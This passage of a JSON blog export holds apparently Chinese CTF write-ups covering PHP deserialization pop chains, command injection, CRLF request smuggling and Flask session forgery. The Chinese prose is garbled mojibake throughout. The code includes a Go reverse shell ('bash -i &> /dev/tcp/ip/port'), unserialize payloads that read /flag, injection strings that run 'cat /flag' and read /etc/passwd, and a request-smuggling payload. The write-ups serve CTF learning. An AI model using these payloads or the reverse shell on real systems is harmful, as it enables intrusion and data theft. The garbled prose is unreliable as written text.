preg_replace('/\\.\\.*/', '.', $s);\n    $s = urldecode($s);\n    $s = htmlentities($s, ENT_QUOTES, 'UTF-8');\n    return strip_tags($s);\n}\n\n$un = unserialize($_POST['pop']); //\nthrow new Exception('seino');\n```\n\né“¾å­å¦‚ä¸‹ï¼š\n\n```php\n<?php\nclass night\n{\n public $night;\n}\n\nclass day\n{\n    public $day;\n}\n\nclass light\n{\n    public $light;\n}\nclass dark\n{\n    public $dark;\n}\n$a=new night();\n$a -> night=new day();\n$a -> night ->day=new dark();\n$a ->night ->day -> dark=new light();\n$a -> night ->day ->dark -> light=new day();\n$a ->night ->day ->dark ->light->day=new dark();\n$a ->night ->day ->dark ->light->day->dark='php://filter/convert.base64-encode/resource=/flag';\necho serialize($a);\n?>\n```\n\néœ€è¦æ³¨æ„çš„ç‚¹å°±æ˜¯è¿™é‡Œä¼šè¿‡æ»¤/flag çš„ç¬¬ä¸€ä¸ª`/`ç›´æ¥ç”¨ä¼ªåè®®è¯»å°±å¯ä»¥äº†\n\nå…¶æ¬¡å°±æ˜¯`throw new Exception('seino');`é˜»æ­¢æˆ‘ä»¬çš„é“¾å­ å…¶å®è€ƒç‚¹å°±æ˜¯fast destrcut\n\néšä¾¿ç ´åé“¾å­çš„ç»“æ„å¯ä»¥äº† ä¹‹å‰è§è¿‡\n\npayload:\n\n```\nO:5:\"night\":1:{s:5:\"night\";O:3:\"day\":1:{s:3:\"day\";O:4:\"dark\":1:{s:4:\"dark\";O:5:\"light\":1:{s:5:\"light\";O:3:\"day\":1:{s:3:\"day\";O:4:\"dark\":1:{s:4:\"dark\";s:49:\"php://filter/convert.base64-encode/resource=/flag\";}}}}}}\n```\n\nç„¶åè¿™é‡Œè¿˜æœ‰å‘ å‘ç°ä¼ ä¸Šå»ä¹‹åæ²¡ç”¨ ç”¨ä¸äº†\n\nç„¶åè¿™é‡Œå¤åˆ¶ä»£ç åˆ°vscodeæ‰å‘ç°ç„æœº\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686228298550-cd785a8f-057e-4944-8fbd-e3b6aba0b7f2.png)\n\nä¼ å‚è¿™é‡Œæœ‰unicodeä¸å¯è§å­—ç¬¦ [U+2066]ç±»ä¼¼äºè¿™æ ·çš„æ˜¯æ§åˆ¶æ–‡æœ¬æ˜¾ç¤ºæ–¹å‘çš„ æ²¡å¿…è¦ç»†ç©¶\n\nç„¶åä¼ å‚è‚¯å®šæ˜¯è¿™ä¸€å¨ éœ€è¦urlç¼–ç ä¸€ä¸‹\n\npyaload:`%E2%80%AE%E2%81%A6%E5%BF%AB%E7%BB%99%E6%88%91%E4%BC%A0%E5%8F%82%E2%81%A9%E2%81%A6pop=O:5:\"night\":1:{s:5:\"night\";O:3:\"day\":1:{s:3:\"day\";O:4:\"dark\":1:{s:4:\"dark\";O:5:\"light\":1:{s:5:\"light\";O:3:\"day\":1:{s:3:\"day\";O:4:\"dark\":1:{s:4:\"dark\";s:49:\"php://filter/convert.base64-encode/resource=/flag\";}}}}}`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686229023127-78b15df4-f547-4e95-941c-36a93eec2677.png)\n\n## test\n\nè¿›å»æ˜¯ä¸€ä¸ªç™»å½•æ¡† å¯ä»¥æ³¨å†Œ ç„¶åç™»å½• ç„¶åå°±ä¼šæ˜¾ç¤º `hello ç™»å½•å`çœ‹åˆ°è¿™é‡Œè°ä¸ä¼šæƒ³åˆ°æ˜¯sstiå‘¢ ä½†æ˜¯è¿™æ˜¯ä¸€ä¸ªå¹Œå­ ç„¶ååœ¨ç™»é™†é¡µé¢çœ‹æºç å¯ä»¥å‘ç°\t`/profile/index` å•¥ä¹Ÿæ²¡æœ‰ å½“ç„¶å¦‚æœçœŸæ²¡ç”¨ ä»–ä¹Ÿä¸ä¼šç‰¹æ„è®¾ç½® å”‰ æˆ‘çœŸæ˜¯çŒªè„‘ ç„¶åå¯ä»¥è®¿é—®`/profile/admin`MD5è§£å¯† è·å¾— adminçš„å¯†ç  asdfgh123\n\nè¿›å»ä¹‹å çœ‹äº†å¤§ä½¬çš„wp æç¤ºå¸®æˆ‘ä»¬è¿è¡Œgoæ–‡ä»¶\n\nç„¶åæ‰‹å†™ä¸€ä¸ªä¸Šä¼ æ¡†  äº®senseiç»™çš„\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>POSTæ•°æ®åŒ…POC</title>\n  </head>\n  <body>\n    <form action=\"http://15e46d8b.clsadp.com/Adm1nUp104d\" method=\"post\" enctype=\"multipart/form-data\">\n      <!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥-->\n      <label for=\"file\">æ–‡ä»¶åï¼š</label>\n      <input type=\"file\" name=\"uploadfilename\" id=\"file\"><br>\n      <input type=\"submit\" name=\"submit\" value=\"æäº¤\">\n    </form>\n  </body>\n</html>\n```\n\nä¸Šä¼ ä¸Šå»ä¹‹åæŠ“åŒ…å°† nameæ”¹ä¸ºfile \n\nè¿™é‡Œé—®åç«¯javaèˆå‹è¯´æ˜¯å› ä¸ºåç«¯å¯èƒ½å­˜åœ¨ä¸€ä¸ªåä¸ºfileçš„å˜é‡æ¥æ¥å—ä»– æ‰€ä»¥è¿™é‡Œè¦æ”¹ä¸ºfile tql ç»ˆäºæ˜ç™½äº†\n\nå› æ­¤` <input type=\"file\" name=\"uploadfilename\" id=\"file\"><br>`ä¸­çš„nameå€¼ä¸æ˜¯å›ºå®šçš„ è¦æ ¹æ®æƒ…å†µè€Œå®š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686235767394-f3ed6a07-925e-44c0-939f-3166d70d17a3.png)\n\nç„¶åä¸Šä¼ goçš„åå¼¹shellæ–‡ä»¶(å·çš„) å¦‚ä¸‹\n\n```go\npackage main\n\nimport (\n    \"fmt\"\n    \"log\"\n    \"os/exec\"\n)\n\nfunc main() {\n    cmd := exec.Command(\"/bin/bash\", \"-c\", \"bash -i &> /dev/tcp/ip/port 0>&1\")\n    out, err := cmd.CombinedOutput()\n    if err != nil {\n      fmt.Printf(\"combined out:\\n%s\\n\", string(out))\n      log.Fatalf(\"cmd.Run() failed with %s\\n\", err)\n  }\n    fmt.Printf(\"combined out:\\n%s\\n\", string(out))\n}\n```\n\nå°±å¯ä»¥äº† çœŸçš„tql\n\n## unserialize\n\nè¿™é“é¢˜ç›®å¾ˆå¯æƒœ åº”è¯¥æ˜¯å‡ºäº†çš„ é€šè¿‡åå°„æ¥ä¿®æ”¹ç±»çš„çš„ç§æœ‰å±æ€§\n\næºç å¦‚ä¸‹;\n\n```php\n<?php\n  highlight_file(__FILE__);\nheader(\"Content-type:text/html;charset=utf-8\");\nrequire_once \"waf.php\";\nerror_reporting(0);\nclass getFlag{\n  private $password;\n  private $cmd;\n  public function __destruct(){\n    if($this->password==\"sectet\" ) //how to change the private variables secret\"\n    {\n      system($this->cmd);\n    }\n  }\n}\n\n$a = $_GET['a'];\nif(isset($_GET['a'])){\n  @eval(waf($a));\n}\n  ?>\n```\n\nçœ‹äº†å¤§ä½¬çš„WP æœ‰ä¸ªå¾ˆç®€å•çš„éé¢„æœŸ\n\n### éé¢„æœŸ\n\nç›´æ¥é€šè¿‡%0a æ¢è¡Œç¬¦è¿›è¡Œbypass\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685803232225-93d4798a-5be8-4d62-a11b-e8aac6f367da.png)\n\npayloadï¼š`a=system%0a('cat /flag');`\n\n ä»¥ååšé¢˜ `%00 ç©ºå­—ç¬¦ %20 ç©ºæ ¼ç¬¦ %0a æ¢è¡Œç¬¦`è¿™ç§éé¢„æœŸè¦å¤šå°è¯•\n\n### é¢„æœŸ\n\nè‰ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼\n\nè¿™ä¸ªé¢˜ç›® å›è¿‡å¤´å†çœ‹æˆ‘çš„payloadæ˜¯å¯¹çš„ åªä¸è¿‡æŠŠ`sectet`æ‹¼æˆ`secret`ä¸æ˜¯ sectetæ˜¯ä»€ä¹ˆå•Š æˆ‘çœŸæœäº† æˆ‘ä¸€ç›´å½“ä½œsecretåœ¨åšé¢˜ md æˆ‘çœŸæ— è¯­äº† sectetåˆ°åº•æ˜¯å‡ºé¢˜äººæ‹¼é”™äº† è¿˜æ˜¯æœ‰å«ä¹‰å•Š æˆ‘çœŸæœäº†\n\nåˆ©ç”¨PHPåå°„æ¥ç»™ç§æœ‰å±æ€§èµ‹å€¼ä»¥åŠè°ƒç”¨ç§æœ‰å‡½æ•°\n\nå‚è€ƒè¿™ç¯‡æ–‡ç« ï¼šåˆ†æçš„å¾ˆç»† https://juejin.cn/post/6844904148891074568\n\nåˆ†æï¼š\n\n```php\n<?php\nclass getFlag{\n    private $password;\n    private $cmd;\n    private function display(){\n        echo $this->password;\n    }\n}\n$get_flag = new getFlag();\n$refClass = new ReflectionClass('getFlag');\n$property = $refClass->getProperty('password'); //è·å–å±æ€§å€¼\n$property->setAccessible(true); //ä¿®æ”¹å¯¹è±¡$propertyçš„å¯è®¿é—®å±æ€§\n$property->setValue($get_flag, 'sectet');  //ä¿®æ”¹å€¼\n$property = $refClass->getProperty('cmd');//è·å–å±æ€§å€¼\n$property->setAccessible(true);//ä¿®æ”¹å¯¹è±¡$propertyçš„å¯è®¿é—®å±æ€§\n$property->setValue($get_flag, 'ls /'); //ä¿®æ”¹å€¼\nvar_dump($get_flag); //æ‰“å°æºå¯¹è±¡å±æ€§å€¼\n?>\n//class getFlag#1 (2) {\n  private $password =>\n  string(6) \"secret\"\n  private $cmd =>\n  string(4) \"ls /\"\n}\na=$get_flag = new getFlag();$refClass = new ReflectionClass('getFlag');$property = $refClass->getProperty('password'); $property->setAccessible(true); $property->setValue($get_flag, 'sectet');  $property = $refClass->getProperty('cmd');$property->setAccessible(true);$property->setValue($get_flag, 'ls /');\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685805828849-a21b53f3-1ce1-41c7-a71d-3c0796298211.png)\n\n## Esc4pe_T0_Mong0\n\næ²¡æºç  æš‚å®š\n\n# Misc\n\n## ç®¡é“\n\nä¸€é“å…³äºå›¾ç‰‡éšå†™çš„é¢˜ç›® ç›´æ¥ `zsteg -a 1.png|grep \"flag\"`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686062254676-b77d0ea0-ca69-4769-914c-58379f6e7b6b.png)\n\n## å¯æ˜¯é›ªå•Šé£˜è¿›åŒçœ¼\n\né¦–å…ˆæ˜¯ä¸€æ®µéŸ³é¢‘å’Œä¸€ä¸ªæ–‡æœ¬ ç„¶åæ‹–è¿›AudacityæŸ¥çœ‹æ³¢å½¢å›¾ ä¸€æ®µæ‘©æ–¯ç”µç  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686062510940-7c390b3f-68a7-411f-94c4-5d22536f7537.png)\n\nä¸Šç½‘æŸ¥ä¸€ä¸‹å­¦ä¹ ä¸€ä¸‹ å¾—åˆ°`.-- --- .- .. ... .... .- -. -..- ..`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686063064061-e8f63abe-d04f-4cec-bd58-a675810b402e.png)\n\nå¾—åˆ°å¯†æ–‡WOAISHANXI\n\nä½†æ˜¯è¿˜æ˜¯æ²¡æ³•è§£å¼€åŠ å¯†çš„å‹ç¼©åŒ…\n\nç„¶åè¿˜æœ‰ä¸€ä¸ªæ–‡æœ¬ ä»åå­—ä¸Šèƒ½çœ‹å‡ºæ˜¯snowåŠ å¯† \n\nåœ¨https://darkside.com.au/snow/ä¸‹è½½ä¸€ä¸ªè„šæœ¬ è¾“å…¥åˆšæ‰å¾—åˆ°çš„å¯†ç  ç„¶åè§£å¯†å³å¯\n\n```\nsnow.exe -p WOAISHANXI -C snow.txt\n```\n\nå¾—åˆ°\n\nè·å¾—flagå‹ç¼©åŒ…çš„å¯†ç \n\nç„¶åæˆ‘è¿™é‡ŒbinwalkæŠ½é£äº† å¾ˆå¥‡æ€ª ä¹‹å‰ç”¨çš„å¥½å¥½çš„ ç›å¾·\n\n æ‰¾åˆ°åŸå› äº† åŸæ¥è¦ç”¨rootè¿è¡Œåœ¨ä¹‹ååŠ ä¸Š `--run-as=root`å°±å¯ä»¥äº†\n","tags":["popé“¾"],"categories":["å„èµ›äº‹WP"]},{"title":"NSSCTFRound#13 Web","url":"/post/a2e74ccf.html","content":"\nNSSCTFRound#13 Web\n\n<!--more-->\n\n# flask?jwt?\n\nä¸€é“ç®€å•çš„sessionä¼ªé€ é¢˜ç›® \n\nç™»å½•æ¡† æ‰¾å›å¯†ç å¤„æŠ“åŒ…å¯ä»¥çœ‹åˆ°key `th3f1askisfunny`\n\nç„¶åsessionä¼ªé€ å³å¯\n\nè¿™é‡Œç¨å¾®æ³¨æ„ä¸€ä¸‹å°±æ˜¯`{'_fresh': True, '_id': '265688f22c7df9002e7945b00aed58a7d242ad62b885769d87fd147973f6e663d4e0cdece191e918da66579e1ae54cd9c622333f1832675ef4d8e3f28a66286e', '_user_id': '2'}`\n\nä»¥å¾€æˆ‘ä»¬éƒ½æ˜¯å°†nameæ”¹ä¸ºadminå³å¯ è¿™é“é¢˜ç›®å°†2æ”¹ä¸º1å³å¯ æ”¹ä¸º0çš„è¯å°±æ˜¯æ²¡ç™»å½•çŠ¶æ€\n\n# ez_factors\n\nfactorsæ˜¯linuxè‡ªå¸¦çš„ä¸€ä¸ªå› å¼åˆ†è§£å‘½ä»¤\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685889160546-2005ec4d-9a98-4a80-9e14-fee82b88af57.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685889248604-c2be769c-5f1d-4597-a7ea-285b97e3c2a4.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685889267180-68e09028-c066-4c24-8a06-3d5b1870d89d.png)\n\nå‘ç°é¢˜ç›®æ˜¾ç¤ºçš„ç»“æœä¸æˆ‘ä»¬åœ¨linuxæ‰§è¡Œfactorä¸€æ · é‚£ä¹ˆçŒœæµ‹è¿™é‡Œå­˜åœ¨å‘½ä»¤æ‰§è¡Œ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685889334541-7c569cc4-1cdf-47cb-ba3a-af0cfd2d6d4a.png)\n\nå‘ç°æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤æ˜¯å¯ä»¥çš„ è¯»ä¸€ä¸‹/etc/passwd\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685889385397-f451cb1c-983c-4bd0-9d57-d71c0e036345.png)\n\nä¹Ÿæ˜¯æœ‰å›æ˜¾çš„ è¯´æ˜æˆ‘ä»¬å‘½ä»¤æ˜¯æ‰§è¡ŒæˆåŠŸçš„ ä½†æ˜¯è¾“å‡ºç»“æœè¿‡æ»¤æ‰äº†é™¤å†’å·å’Œæ•°å­—ä»¥å¤–çš„ç¬¦å·\n\nè¿™é‡Œæ³¨æ„ä¸€ä¸‹è¦å°†æˆ‘ä»¬è·¯å¾„ä¸­çš„æ–œæ éœ€è¦urlç¼–ç ä¸€ä¸‹ é˜²æ­¢ä¸urlä¸­çš„åæ–œæ äº§ç”Ÿæ­§ä¹‰\n\næ‰€ä»¥æˆ‘åªè¦ä½¿å…¶è¾“å‡ºå…¨éƒ¨ä¸ºæ•°å­— å°±èƒ½bypassäº†\n\nè¿™é‡Œç”¨åˆ°äº†odå‘½ä»¤\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685890407040-e7f3bcc3-2733-4f05-b105-964779b50649.png)\n\npayload:`114514;od%20-t%20d1%20%2Fflag`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685890848402-df76c787-edac-4b49-8e87-e33f941eb3ef.png)\n\nod -t d1çš„å‘½ä»¤è§£é‡Šï¼š![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685890875226-8b96b7b2-8dcf-463b-83c9-3b0698dcce6b.png)\n\nè¾“å‡ºäº†æ¯ä¸ªå­—èŠ‚æŒ‰åè¿›åˆ¶è¾“å‡º\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685890900112-c8886efe-e6d4-447b-9282-10d0ab6bce08.png)\n\næ³¨æ„å‰é¢çš„æ˜¯åºå·\n\n78   83   83   67   84   70  123  101   99   52   52   49  102   52   98   45 52   50   48  101   45   52   48   53   55   45   56   51   53   97   45   51 97   50   50   53  102   98   99   56  102   53   57  125   10\n\nå°†æ¯ä¸ªåè¿›åˆ¶è½¬ä¸ºåå…­è¿›åˆ¶ç„¶åè½¬ä¸ºå­—ç¬¦ä¸²å³å¯\n\nåå…­è¿›åˆ¶ï¼š4E 53 53 43 54 46 7B 65 63 34 34 31 66 34 62 2D 34 32 30 65 2D 34 30 35 37 2D 38 33 35 61 2D 33 61 32 32 35 66 62 63 38 66 35 39 7D 0A\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685891274348-6b1b73c6-5ab4-4a85-a054-4c690fa0399c.png)\n\n# ä¿¡æ¯æ”¶é›†\n\nè¿™ä¸ªé¢˜ç›®åšçš„å¾ˆæ‡µé€¼ \n\nè®¿é—®index.php æœ‰ä¸ªæ–‡ä»¶åŒ…å«\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685891636930-b6f7fd18-9e51-4da2-bbff-8f3bad0af203.png)\n\npayloadçš„æ˜¯ï¼š`GET /nssctf/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/flag.txt HTTP/1.1`\n\næœ€ç»ˆåœ¨è¯·æ±‚åŒ…ä¸­è¾¾åˆ°çš„æ•ˆæœä¸ºï¼š\n\n```php\nGET /nssctf/1 HTTP/1.1\nHost: localhost\n\nGET /flag.txt HTTP/1.1\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685891844152-426610f9-325e-4931-8a2e-4c11ec531881.png)\n\nçœ‹å¤§ä½¬WPæ˜¯Apache HTTP Server è¯·æ±‚èµ°ç§æ¼æ´ CVE-2023-25690  å‚è€ƒï¼šhttps://xz.aliyun.com/t/12345\n\nè¿˜æœ‰CRLFæ³¨å…¥ å‚è€ƒhttps://www.cnblogs.com/mysticbinary/p/12560080.html\n\n é—®äº†ä¸€ä¸‹GPT æ„Ÿè§‰è¯´çš„å¾ˆåˆ°ä½\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685893209885-190c8bdf-5096-432d-aa41-1e3b330ed3f9.png)\n\næ¯”å¦‚æˆ‘ä»¬å¯ä»¥bpæŠ“åŒ…ä¸€ä¸‹ å°±å¯ä»¥çœ‹åˆ°è¯·æ±‚ä½“å†…å®¹ç»“å°¾éƒ½æ˜¯`\\r\\n`ç»“å°¾çš„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685893262097-fc9bc818-3057-40e5-9682-ff08840dfb9b.png)\n\nåœ¨HTTPå½“ä¸­HTTPçš„Headerå’ŒBodyä¹‹é—´å°±æ˜¯ç”¨ä¸¤ä¸ªcrlfè¿›è¡Œåˆ†éš”çš„ï¼Œå¦‚æœèƒ½æ§åˆ¶HTTPæ¶ˆæ¯å¤´ä¸­çš„å­—ç¬¦ï¼Œå°±èƒ½æ³¨å…¥ä¸€äº›æ¶æ„çš„æ¢è¡Œ\n\næ¯”å¦‚chatGPTåœ¨å…¶ä¸­æ¶æ„æ·»åŠ `crlf`(`\\r\\n`) å†åŠ å…¥ä¸€ä¸ªæ¶æ„åˆ¶é€ çš„è¯·æ±‚ä½“ å¯¼è‡´è§£æå‡ºé—®é¢˜\n\nå›åˆ°é¢˜ç›® è¯» `/usr/local/apache2/conf/httpd.conf `\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685893714348-0be9e595-5bb8-4700-a349-65a365c46e4b.png)\n\nçœ‹å¤§ä½¬wpæ˜¯ åšäº†ä¸ªproxyè½¬å‘\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685893829245-9b00596b-9ab3-444f-9071-919a318397fc.png)\n\nè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆpayloadè®¿é—®çš„æ˜¯localhost ä»å†…éƒ¨ç½‘ä¸Šçš„æœåŠ¡å™¨å»è¯»flag.txt\n\n\n\n# MyWeb\n\næºç å¦‚ä¸‹ï¼š\n\n```php\n<?php\nerror_reporting(E_ALL);\n// å†™äº†ä¸ªç½‘é¡µå­˜å‚¨JSONæ•°æ®ï¼Œä½†æ˜¯è¿˜ä¸ä¼šå¤„ç†jsonæ ¼å¼ï¼Œè¿™æ ·å¤„ç†åº”è¯¥æ²¡æœ‰ä»€ä¹ˆé—®é¢˜å§\n\nif ($_GET['mode'] == 'save') {\n    $data = file_get_contents('/tmp/data.json');\n    $value = addslashes($_GET['value']);\n    $data = str_replace(']', \", '$value']\", $data);\n    file_put_contents('/tmp/data.json', $data);\n} else if ($_GET['mode'] == 'read') {\n    $data = file_get_contents('/tmp/data.json');\n    eval('$data = ' . $data . ';');\n    print_r($data);\n} else {\n    highlight_file(__FILE__);\n}\n```\n\nç±»ä¼¼äºä¸€ä¸ªæ²™ç®±é€ƒé€¸å§ æ„é€ ç‰¹æ®Šçš„æ–¹å¼æ¥bypass\n\nmode=save è¯»å…¥ mode=read è¯»å‡º\n\nä¸»è¦æ˜¯ï¼š `$data = str_replace(']', \", '$value']\", $data);`åˆ©ç”¨è¿™ä¸ªé€ƒé€¸\n\næˆ‘ä»¬ä¸è¾“å…¥ä»»ä½•å†…å®¹ç›´æ¥è¯»ä¸€ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685975601896-db938c1a-e2b4-45c2-97f5-9d5776fb37c5.png)\n\nå‘ç°åªæœ‰ä¸€ä¸ªå…ƒç´ 1\n\nè¿™é‡Œå°±ç±»ä¼¼äºæ„é€ sqlæ³¨å…¥ä¸€æ · æ„é€ è®©`[]`å»é—­åˆå†åŠ ä¸Šæ³¨é‡ŠåŠ æ¢è¡Œ`%0a` ç›¸äº’æ¢æ¥æ¢å» æ€»æœ‰ä¸€ç§æ–¹å¼å¯ä»¥\n\nåŸæ¥å½¢å¼çŒœæµ‹æ˜¯[1]\n\næ›¿æ¢å`[1,$value]`\n\nåˆ™æˆ‘ä»¬æ„é€ `];//%0a<shell>;//%0a[`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685976182529-dead647c-0922-4d2b-b2b1-ac053420687a.png)\n\n\n\n# flask?jwt?(hard)\n\nè¿™é“å°±æ˜¯ç¬¬ä¸€é“çš„åŠ å¼ºç‰ˆ keyæ²¡æœ‰ç»™æˆ‘ä»¬ æ‰€ä»¥åªèƒ½å»æ‰¾\n\nå‘ç°æç¤º æœ‰ä¸ªè·¯ç”±`/wor`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685976386165-68580a32-578a-4527-a49c-081a5a841acf.png)\n\nå‘ç°å®ƒå¯ä»¥è·å–æˆ‘ä»¬ä¸Šæ¬¡çš„ç™»é™†æ—¶é—´ \n\nå½“æ—¶è¿™é‡Œå°±æ²¡æœ‰æ€è·¯äº†\n\nçœ‹äº†WP è®¿é—®`/wor`è®©å…¶æŠ¥é”™ ç„¶åèƒ½çœ‹åˆ°æºç ä¸­çš„key\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685977285646-aec5a446-c9c9-459d-9a35-1122b6cb80bc.png)\n\nkeyï¼š`hardgam3_C0u1d_u_f1ndM3????`\n\nè¿™æ ·è·å–keyçš„æ–¹å¼è¿˜æ˜¯ç¬¬ä¸€æ¬¡è§ æ¶¨çŸ¥è¯†äº† \n\næ¥ç€å°±æ˜¯è€å¥—è·¯ sessionä¼ªé€ è·å–flagå³å¯\n\nè¿™é‡Œsessionä¼ªé€ çš„æ—¶å€™æŠŠåé¢å…³äºæ—¶é—´çš„æ•°æ®å»æ‰ï¼Œæˆ–è€…åŠ ä¸Šå¼•å·ï¼Œä¸ç„¶ä¼šæŠ¥é”™\n\n# TimeTrcer\n\næ”¾è¿‡è‡ªå·±\n","tags":["flask sessionä¼ªé€ ","æ²™ç®±é€ƒé€¸"],"categories":["å„èµ›äº‹WP"]},{"title":"CISCN-16 å›½èµ›åˆèµ›åçš„å¤ç°ä»¥åŠä¸€äº›æ„Ÿæ‚Ÿ","url":"/post/5cb82439.html","content":"\nCISCN-16\n\n<!--more-->\n\n# æ„Ÿæ‚Ÿä»¥åŠæƒ³æ³•\n\nä¸å‡ºæ„å¤–ï¼Œå›½èµ›åˆèµ›è¿˜æ˜¯ä¸€é“é¢˜éƒ½æ²¡æœ‰åšå‡ºæ¥ï¼Œæœ‰å¤ªå¤šçŸ¥è¯†æˆ‘è¿˜æ²¡æœ‰å»æŒæ¡ï¼Œæœ‰å¤ªå¤šé¢˜ç›®æˆ‘è¿˜æ²¡æœ‰å»åšï¼Œèµ›å‰æ€»æ˜¯æ»¡è…”çƒ­è¡€æ€»æƒ³å¤§å¹²ä¸€ç•ªï¼Œä½†æ˜¯æ€»æ˜¯ä¸€é“é¢˜ç›®éƒ½åšä¸å‡ºæ¥ï¼ŒæŠ‘éƒä¸€ä¸‹åˆã€‚\n\næ¯æ¬¡æ¯”èµ›ç»“æŸçœ‹äº†wpæ€»æ˜¯è¯´å“ªä¸ªå“ªä¸ªé¢˜ç›®çœŸç®€å•ï¼Œå¤ªå¯æƒœäº†ï¼Œä½†æ˜¯ï¼Œäº‹å®çœŸæ˜¯å¦‚æ­¤å—ã€‚\n\nä»€ä¹ˆæ˜¯éš¾é¢˜ï¼Ÿ\n\næˆ‘è®¤ä¸ºè¿™ä¸ªé—®é¢˜å…·æœ‰ç›¸å¯¹æ€§ï¼Œç›¸å¯¹äºäººï¼Œä¹Ÿç›¸å¯¹äºæ—¶ç©ºã€‚\n\nç›¸å¯¹äºäººï¼šä¸€é“é¢˜ç›®ï¼Œå¦‚æœå¯¹äºçŸ¥è¯†å‚¨å¤‡é‡å¤šçš„äººè€Œè¨€ï¼Œè§å¤šè¯†å¹¿ï¼Œåˆ™åœ¨å®¡é¢˜ä¸­åˆ™ä¼šå‘ç°ç«¯å€ªï¼Œç”šè‡³æ˜¯ä¸€çœ¼ä¸çœŸï¼Œè€Œå¯¹äºä¸€ä¸ªçŸ¥è¯†å‚¨å¤‡é‡å¹¶ä¸æ˜¯å¾ˆå……è¶³çš„äººæ¥è¯´ï¼Œå¯èƒ½æ‹¿åˆ°é¢˜ç›®å¹¶ä¸èƒ½æ‰¾åˆ°ä»–çš„è€ƒç‚¹ï¼Œç”šè‡³æ˜¯å››å¤„ä¹±æ’ï¼Œè€Œæˆ‘ï¼Œåœ¨è¿™æ¬¡æ¯”èµ›ä¸­å°±æ˜¯å¦‚æ­¤ï¼Œä¸€é“é¢˜ç›®ä¸çŸ¥é“ä»–çš„è€ƒç‚¹å°±ä¼šæ ¹æ®æˆ‘èƒ½æ•æ‰åˆ°åˆ°çš„æˆ–è€…æ˜¯é¢˜ç›®æ³„éœ²å‡ºæ¥ä»…æœ‰çš„ä¿¡æ¯å»é€ä¸ªé€ä¸ªæ£€ç´¢ï¼Œå¯èƒ½è¿æ°”å¥½ä¼šæ£€ç´¢å‡ºæ¥ï¼Œä½†æ˜¯å¤±è´¥æ€»æ˜¯æ¥å¾—æ›´åŠ é¢‘ç¹ã€‚\n\nç›¸å¯¹äºæ—¶ç©ºï¼šæˆ‘ä¼šæˆé•¿ï¼Œåšé¢˜äº¦å¦‚æ­¤ã€‚ä¸€é“ç°åœ¨åšä¸å‡ºæ¥çš„é¢˜ç›®ï¼Œä¹‹åå»è®¤çœŸå­¦ä¹ 